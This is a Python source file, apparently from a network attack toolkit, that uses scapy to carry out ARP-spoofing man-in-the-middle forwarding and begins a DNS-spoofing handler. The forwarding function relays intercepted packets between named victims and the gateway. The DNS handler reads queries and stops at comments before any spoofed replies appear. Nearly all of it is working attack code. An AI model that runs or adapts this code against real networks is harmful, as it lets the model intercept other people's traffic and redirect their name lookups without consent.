from attacks.arp_spoof import ARPAttackSettings
from dataclasses import dataclass
from scapy.all import *
from util import Interface

@dataclass
class DNSEntry:
    url: str
    type: str
    ip: str

@dataclass
class DNSAttackSettings:
    arp_settings: ARPAttackSettings
    dns_rules: list[DNSEntry]

def forward_packet(settings: ARPAttackSettings, packet: Packet):
    interface = settings.interface
    victims = settings.sources
    gateway = settings.destinations[0]

    # We can only forward packets if we know where it should go
    if (not (Ether in packet and IP in packet)
       # Skip packets that are not addressed to our interface
       or (packet[Ether].dst != interface.mac_addr.lower())
       # Don't forward packets that we sent
       or (packet[IP].src == interface.ip_addr)
       # Don't forward packets that are sent to us
       or (packet[IP].dst == interface.ip_addr)):
        return

    print(f'Forwarding {packet.summary()}')

    # victim -> gateway
    for victim in victims:
        if packet[IP].src == victim.ip_addr:
            packet[Ether].src = interface.mac_addr
            packet[Ether].dst = gateway.mac_addr
            print(f'As {packet.summary()}')
            sendp(packet, verbose=0)
            return

    # gateway -> victim
    for victim in victims:
        if packet[IP].dst == victim.ip_addr:
            packet[Ether].src = interface.mac_addr
            packet[Ether].dst = victim.mac_addr
            print(f'As {packet.summary()}')
            sendp(packet, verbose=0)
            return

def handle_packet(settings: DNSAttackSettings, packet: Packet):
    """
    Inspects a packet.

    All packets are forwarded unless we should
    spoof the DNS request in the packet.
    """

    # We only handle packets that have UDP, IP and DNS protocols
    # Packet must contain DNS query and IP layer
    if not (DNS in packet and IP in packet and UDP in packet):
        return forward_packet(settings.arp_settings, packet)

    # check for dns standard query
    # if packet[DNS].opcode != 0:
    if DNSQR not in packet:
        return forward_packet(settings.arp_settings, packet)

    qry = packet[DNSQR]

    print(f'query: {qry}')
    print(qry.qname)
    print(qry.get_field('qtype').i2repr(qry, qry.qtype))

    forward_packet(settings.arp_settings, packet)
    
    # check queries
    # DNS query must match